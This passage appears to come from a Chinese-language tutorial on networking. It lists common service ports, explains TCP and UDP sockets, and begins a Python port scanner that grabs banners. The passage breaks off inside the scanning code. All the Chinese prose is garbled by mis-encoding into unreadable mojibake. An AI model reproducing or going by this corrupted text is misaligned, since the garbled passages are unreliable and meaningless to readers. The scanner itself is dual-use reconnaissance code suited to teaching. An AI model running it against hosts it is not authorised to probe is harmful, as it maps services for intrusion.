id="é‚®ä»¶æœåŠ¡">é‚®ä»¶æœåŠ¡</h3><table><thead><tr><th>ç«¯å£</th><th>åè®®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>25</td><td>SMTP</td><td>å‘é€é‚®ä»¶</td></tr><tr><td>110</td><td>POP3</td><td>æ¥æ”¶é‚®ä»¶</td></tr><tr><td>143</td><td>IMAP</td><td>é‚®ä»¶è®¿é—®</td></tr><tr><td>465</td><td>SMTPS</td><td>SMTPåŠ å¯†ç‰ˆ</td></tr><tr><td>993</td><td>IMAPS</td><td>IMAPåŠ å¯†ç‰ˆ</td></tr><tr><td>995</td><td>POP3S</td><td>POP3åŠ å¯†ç‰ˆ</td></tr></tbody></table><h3 id="æ•°æ®åº“">æ•°æ®åº“</h3><table><thead><tr><th>ç«¯å£</th><th>æ•°æ®åº“</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>MySQLæ•°æ®åº“</td></tr><tr><td>5432</td><td>PostgreSQL</td><td>PostgreSQLæ•°æ®åº“</td></tr><tr><td>1521</td><td>Oracle</td><td>Oracleæ•°æ®åº“</td></tr><tr><td>27017</td><td>MongoDB</td><td>MongoDBæ•°æ®åº“</td></tr><tr><td>6379</td><td>Redis</td><td>Redisç¼“å­˜æ•°æ®åº“</td></tr></tbody></table><h3 id="è¿œç¨‹è®¿é—®">è¿œç¨‹è®¿é—®</h3><table><thead><tr><th>ç«¯å£</th><th>åè®®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>å®‰å…¨å¤–å£³åè®®</td></tr><tr><td>23</td><td>Telnet</td><td>è¿œç¨‹ç»ˆç«¯ï¼ˆä¸å®‰å…¨ï¼‰</td></tr><tr><td>3389</td><td>RDP</td><td>Windowsè¿œç¨‹æ¡Œé¢</td></tr><tr><td>5900</td><td>VNC</td><td>è™šæ‹Ÿç½‘ç»œè®¡ç®—</td></tr></tbody></table><h3 id="å…¶ä»–å¸¸ç”¨ç«¯å£">å…¶ä»–å¸¸ç”¨ç«¯å£</h3><table><thead><tr><th>ç«¯å£</th><th>åè®®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>53</td><td>DNS</td><td>åŸŸåè§£æ</td></tr><tr><td>67/68</td><td>DHCP</td><td>åŠ¨æ€ä¸»æœºé…ç½®</td></tr><tr><td>161</td><td>SNMP</td><td>ç®€å•ç½‘ç»œç®¡ç†</td></tr><tr><td>445</td><td>SMB</td><td>Windowsæ–‡ä»¶å…±äº«</td></tr><tr><td>3000</td><td>Node.js</td><td>å¸¸ç”¨å¼€å‘ç«¯å£</td></tr><tr><td>5000</td><td>Flask</td><td>Python Flaské»˜è®¤</td></tr><tr><td>8000</td><td>Django</td><td>Python Djangoå¸¸ç”¨</td></tr></tbody></table><h2 id="ğŸ”§-Socketç¼–ç¨‹">ğŸ”§ Socketç¼–ç¨‹</h2><h3 id="ä»€ä¹ˆæ˜¯Socketï¼Ÿ">ä»€ä¹ˆæ˜¯Socketï¼Ÿ</h3><p><strong>Socket</strong>ï¼ˆå¥—æ¥å­—ï¼‰æ˜¯ç½‘ç»œç¼–ç¨‹çš„åŸºç¡€æ¥å£ï¼Œç”¨äºå®ç°ç½‘ç»œé€šä¿¡ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Socket = ç”µè¯æœº<br><br>æ‰“ç”µè¯çš„è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> æ‹¿èµ·ç”µè¯ï¼ˆåˆ›å»ºSocketï¼‰<br><span class="hljs-bullet">2.</span> æ‹¨å·ï¼ˆè¿æ¥ï¼‰<br><span class="hljs-bullet">3.</span> è¯´è¯ï¼ˆå‘é€æ•°æ®ï¼‰<br><span class="hljs-bullet">4.</span> å¬å¯¹æ–¹è¯´ï¼ˆæ¥æ”¶æ•°æ®ï¼‰<br><span class="hljs-bullet">5.</span> æŒ‚æ–­ï¼ˆå…³é—­Socketï¼‰<br><br>ç½‘ç»œé€šä¿¡çš„è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> åˆ›å»ºSocketå¯¹è±¡<br><span class="hljs-bullet">2.</span> è¿æ¥åˆ°æœåŠ¡å™¨ï¼ˆTCPï¼‰æˆ–å‡†å¤‡å¥½ï¼ˆUDPï¼‰<br><span class="hljs-bullet">3.</span> å‘é€æ•°æ®<br><span class="hljs-bullet">4.</span> æ¥æ”¶æ•°æ®<br><span class="hljs-bullet">5.</span> å…³é—­Socket<br></code></pre></td></tr></table></figure><h3 id="Socketç±»å‹">Socketç±»å‹</h3><h4 id="1-TCP-Socketï¼ˆæµå¼å¥—æ¥å­—ï¼‰">1. TCP Socketï¼ˆæµå¼å¥—æ¥å­—ï¼‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç‰¹ç‚¹ï¼š</span><br>- é¢å‘è¿æ¥<br>- å¯é ä¼ è¾“<br>- æ•°æ®æŒ‰åºåˆ°è¾¾<br>- é€‚ç”¨äºéœ€è¦å¯é ä¼ è¾“çš„åœºæ™¯<br><br><span class="hljs-comment"># ä½¿ç”¨åœºæ™¯ï¼š</span><br>- ç½‘é¡µæµè§ˆï¼ˆHTTP/HTTPSï¼‰<br>- æ–‡ä»¶ä¼ è¾“ï¼ˆFTPï¼‰<br>- é‚®ä»¶å‘é€ï¼ˆSMTPï¼‰<br>- è¿œç¨‹ç™»å½•ï¼ˆSSHï¼‰<br><br><span class="hljs-comment"># Pythonåˆ›å»ºï¼š</span><br><span class="hljs-keyword">import</span> socket<br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br></code></pre></td></tr></table></figure><h4 id="2-UDP-Socketï¼ˆæ•°æ®æŠ¥å¥—æ¥å­—ï¼‰">2. UDP Socketï¼ˆæ•°æ®æŠ¥å¥—æ¥å­—ï¼‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç‰¹ç‚¹ï¼š</span><br>- æ— è¿æ¥<br>- ä¸å¯é ï¼ˆå¯èƒ½ä¸¢åŒ…ï¼‰<br>- é€Ÿåº¦å¿«<br>- é€‚ç”¨äºå®æ—¶æ€§è¦æ±‚é«˜çš„åœºæ™¯<br><br><span class="hljs-comment"># ä½¿ç”¨åœºæ™¯ï¼š</span><br>- è§†é¢‘ç›´æ’­<br>- è¯­éŸ³é€šè¯<br>- åœ¨çº¿æ¸¸æˆ<br>- DNSæŸ¥è¯¢<br><br><span class="hljs-comment"># Pythonåˆ›å»ºï¼š</span><br><span class="hljs-keyword">import</span> socket<br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br></code></pre></td></tr></table></figure><h3 id="TCP-Socketç¼–ç¨‹æµç¨‹">TCP Socketç¼–ç¨‹æµç¨‹</h3><h4 id="æœåŠ¡å™¨ç«¯">æœåŠ¡å™¨ç«¯</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">1</span>. åˆ›å»ºSocket<br><span class="hljs-number">2</span>. ç»‘å®šåœ°å€å’Œç«¯å£ï¼ˆ<span class="hljs-keyword">bind</span>ï¼‰<br><span class="hljs-number">3</span>. ç›‘å¬è¿æ¥ï¼ˆ<span class="hljs-keyword">listen</span>ï¼‰<br><span class="hljs-number">4</span>. æ¥å—è¿æ¥ï¼ˆ<span class="hljs-keyword">accept</span>ï¼‰<br><span class="hljs-number">5</span>. æ”¶å‘æ•°æ®ï¼ˆ<span class="hljs-keyword">recv</span>/<span class="hljs-keyword">send</span>ï¼‰<br><span class="hljs-number">6</span>. å…³é—­è¿æ¥ï¼ˆ<span class="hljs-keyword">close</span>ï¼‰<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ åˆ›å»ºSocket  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç»‘å®šç«¯å£    â”‚ <span class="hljs-keyword">bind</span>((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ å¼€å§‹ç›‘å¬    â”‚ <span class="hljs-keyword">listen</span>(<span class="hljs-number">5</span>)<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç­‰å¾…è¿æ¥    â”‚ <span class="hljs-keyword">accept</span>() â† é˜»å¡ç­‰å¾…<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ”¶å‘æ•°æ®    â”‚ <span class="hljs-keyword">recv</span>() / <span class="hljs-keyword">send</span>()<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ å…³é—­è¿æ¥    â”‚ <span class="hljs-keyword">close</span>()<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h4 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">1</span>. åˆ›å»ºSocket<br><span class="hljs-number">2</span>. è¿æ¥æœåŠ¡å™¨ï¼ˆ<span class="hljs-keyword">connect</span>ï¼‰<br><span class="hljs-number">3</span>. æ”¶å‘æ•°æ®ï¼ˆ<span class="hljs-keyword">recv</span>/<span class="hljs-keyword">send</span>ï¼‰<br><span class="hljs-number">4</span>. å…³é—­è¿æ¥ï¼ˆ<span class="hljs-keyword">close</span>ï¼‰<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ åˆ›å»ºSocket  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ è¿æ¥æœåŠ¡å™¨  â”‚ <span class="hljs-keyword">connect</span>((<span class="hljs-string">&#x27;server_ip&#x27;</span>, <span class="hljs-number">8888</span>))<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ”¶å‘æ•°æ®    â”‚ <span class="hljs-keyword">recv</span>() / <span class="hljs-keyword">send</span>()<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜<br>       â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ å…³é—­è¿æ¥    â”‚ <span class="hljs-keyword">close</span>()<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šç«¯å£æ‰«æå™¨">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šç«¯å£æ‰«æå™¨</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç«¯å£æ‰«æå™¨ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day11_port_scanner.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šç«¯å£æ‰«æå™¨</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PortScanner</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;ç«¯å£æ‰«æå™¨&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># å¸¸ç”¨ç«¯å£å’ŒæœåŠ¡çš„æ˜ å°„</span><br>        <span class="hljs-variable language_">self</span>.common_ports = &#123;<br>            <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;FTP-DATA&#x27;</span>,<br>            <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;FTP&#x27;</span>,<br>            <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;SSH&#x27;</span>,<br>            <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;Telnet&#x27;</span>,<br>            <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;SMTP&#x27;</span>,<br>            <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;DNS&#x27;</span>,<br>            <span class="hljs-number">80</span>: <span class="hljs-string">&#x27;HTTP&#x27;</span>,<br>            <span class="hljs-number">110</span>: <span class="hljs-string">&#x27;POP3&#x27;</span>,<br>            <span class="hljs-number">143</span>: <span class="hljs-string">&#x27;IMAP&#x27;</span>,<br>            <span class="hljs-number">443</span>: <span class="hljs-string">&#x27;HTTPS&#x27;</span>,<br>            <span class="hljs-number">445</span>: <span class="hljs-string">&#x27;SMB&#x27;</span>,<br>            <span class="hljs-number">3306</span>: <span class="hljs-string">&#x27;MySQL&#x27;</span>,<br>            <span class="hljs-number">3389</span>: <span class="hljs-string">&#x27;RDP&#x27;</span>,<br>            <span class="hljs-number">5432</span>: <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>,<br>            <span class="hljs-number">6379</span>: <span class="hljs-string">&#x27;Redis&#x27;</span>,<br>            <span class="hljs-number">8080</span>: <span class="hljs-string">&#x27;HTTP-Proxy&#x27;</span>,<br>            <span class="hljs-number">27017</span>: <span class="hljs-string">&#x27;MongoDB&#x27;</span>,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">self, host, port, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰«æå•ä¸ªç«¯å£</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ç›®æ ‡ä¸»æœº</span><br><span class="hljs-string">            port: ç«¯å£å·</span><br><span class="hljs-string">            timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            (port, is_open, service_name) å…ƒç»„</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># åˆ›å»ºTCP Socket</span><br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(timeout)<br><br>            <span class="hljs-comment"># å°è¯•è¿æ¥</span><br>            result = sock.connect_ex((host, port))<br><br>            <span class="hljs-comment"># å…³é—­è¿æ¥</span><br>            sock.close()<br><br>            <span class="hljs-comment"># result = 0 è¡¨ç¤ºè¿æ¥æˆåŠŸï¼ˆç«¯å£å¼€æ”¾ï¼‰</span><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                service = <span class="hljs-variable language_">self</span>.common_ports.get(port, <span class="hljs-string">&#x27;Unknown&#x27;</span>)<br>                <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">True</span>, service)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-keyword">except</span> socket.timeout:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> socket.error:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port_with_banner</span>(<span class="hljs-params">self, host, port, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰«æç«¯å£å¹¶å°è¯•è·å–æœåŠ¡banner</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ç›®æ ‡ä¸»æœº</span><br><span class="hljs-string">            port: ç«¯å£å·</span><br><span class="hljs-string">            timeout: è¶…æ—¶æ—¶é—´</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            (port, is_open, service_name, banner)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        port_result = <span class="hljs-variable language_">self</span>.scan_port(host, port, timeout)<br>        port_num, is_open, service = port_result<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_open:<br>            <span class="hljs-keyword">return</span> (port_num, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># å°è¯•è·å–banner</span><br>        banner = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">2</span>)<br>            sock.connect((host, port))<br><br>            <span class="hljs-comment"># å‘é€ç®€å•çš„è¯·æ±‚</span><br>            <span class="hljs-keyword">if</span> port == <span class="hljs-number">80</span> <span class="hljs-keyword">or</span> port == <span class="hljs-number">8080</span>:<br>                sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.0\r\n\r\n&#x27;</span>)<br><br>            <span class="hljs-comment"># å°è¯•æ¥æ”¶å“åº”</span><br>            banner = sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>).strip()<br>            sock.close()<br><br>            <span class="hljs-comment"># åªä¿ç•™ç¬¬ä¸€è¡Œ</span><br>            <span class="hljs-keyword">if</span> banner:<br>                banner = banner.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>]<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> (port_num, is_open, service, banner)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_range</span>(<span class="hljs-params">self, host, start_port, end_port, timeout=<span class="hljs-number">1</span>, show_closed=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰«æç«¯å£èŒƒå›´</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ç›®æ ‡ä¸»æœº</span><br><span class="hljs-string">            start_port: èµ·å§‹ç«¯å£</span><br><span class="hljs-string">            end_port: ç»“æŸç«¯å£</span><br><span class="hljs-string">            timeout: è¶…æ—¶æ—¶é—´</span><br><span class="hljs-string">            show_closed: æ˜¯å¦æ˜¾ç¤ºå…³é—­çš„ç«¯å£</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å¼€æ”¾ç«¯å£åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ” æ­£åœ¨æ‰«æ <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;start_port&#125;</span>-<span class="hljs-subst">&#123;end_port&#125;</span>&quot;</span>)<br>        <span 